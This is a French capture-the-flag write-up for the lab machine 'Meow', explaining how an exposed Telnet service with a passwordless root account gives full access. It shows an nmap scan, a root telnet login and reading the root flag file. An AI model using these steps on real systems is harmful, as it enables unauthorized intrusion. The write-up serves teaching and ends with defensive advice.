[⬅ Retour à Starting Point](../README.md) · [🏠 Accueil du repo](../../../README.md)

# Machine 1 — Meow

**Telnet non sécurisé — Port 23**

| | |
|---|---|
| **Tier** | 1 |
| **OS** | Linux |
| **Service** | Telnet (23) |

## Concept

Comprendre pourquoi un protocole non chiffré (Telnet) combiné à une mauvaise configuration (compte root sans mot de passe) mène à une compromission totale et immédiate.

## Méthodologie

### Scan de ports

```bash
nmap -sV -sC 10.129.x.x
```

```
23/tcp open  telnet
```

### Connexion et récupération du flag

```bash
telnet 10.129.x.x
```

```
login: root
```

Aucun mot de passe n'est demandé — accès direct.

```bash
cat /root/flag.txt
```

## Points clés

- Telnet transmet identifiants et données en clair, sans aucun chiffrement.
- Un compte root accessible sans mot de passe est une faille de configuration critique.
- Toujours tester une connexion basique avant de chercher des vulnérabilités complexes.

## Leçon retenue

*Désactiver Telnet au profit de SSH, et ne jamais laisser un compte administrateur sans authentification.*

---

[⬆ Index Starting Point](../README.md) · [Suivant : Fawn ➡](02-fawn.md)
